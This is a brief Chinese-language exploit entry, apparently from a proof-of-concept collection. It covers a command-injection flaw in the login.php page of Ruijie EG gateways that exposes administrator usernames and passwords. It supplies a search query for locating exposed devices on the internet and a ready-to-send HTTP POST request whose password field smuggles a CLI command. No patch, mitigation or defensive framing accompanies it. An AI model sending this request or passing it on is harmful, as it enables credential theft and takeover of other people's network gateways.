# 锐捷 EG易网关管理员账号密码泄露漏洞

**<font style="color:rgb(38, 38, 38);">一、漏洞简介</font>**<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);">锐捷EG易网关 login.php存在 CLI命令注入，导致管理员账号密码泄露漏洞  
</font>**<font style="color:rgb(38, 38, 38);">二、影响版本</font>**

```java
锐捷EG易网关
```

<font style="color:rgb(38, 38, 38);">  
</font>**<font style="color:rgb(38, 38, 38);">三、资产测绘</font>**

```java
app="Ruijie-EG易网关"
```

<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);">●登录页面</font>

![1710773302248-caa9069a-265b-44c3-8a1c-ee627b562553.png](./img/MxcQgnIcXQfNL8qR/1710773302248-caa9069a-265b-44c3-8a1c-ee627b562553-391281.png)

<font style="color:rgb(38, 38, 38);">  
</font>**<font style="color:rgb(38, 38, 38);">四、漏洞复现</font>**<font style="color:rgb(38, 38, 38);"></font>

```java
POST /login.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 49
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

username=admin&password=admin?show+webmaster+user
```

<font style="color:rgb(38, 38, 38);">  
</font>![1710773369558-0b735db6-3ccf-4af3-9aaf-4ba360e3dd91.png](./img/MxcQgnIcXQfNL8qR/1710773369558-0b735db6-3ccf-4af3-9aaf-4ba360e3dd91-254157.png)

![1710774024223-cd35f9b5-4b70-45e0-abf7-47aeefe164d6.png](./img/MxcQgnIcXQfNL8qR/1710774024223-cd35f9b5-4b70-45e0-abf7-47aeefe164d6-268712.png)



> 更新: 2024-06-24 11:42:26  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ewl6ikmuyvguq1ps>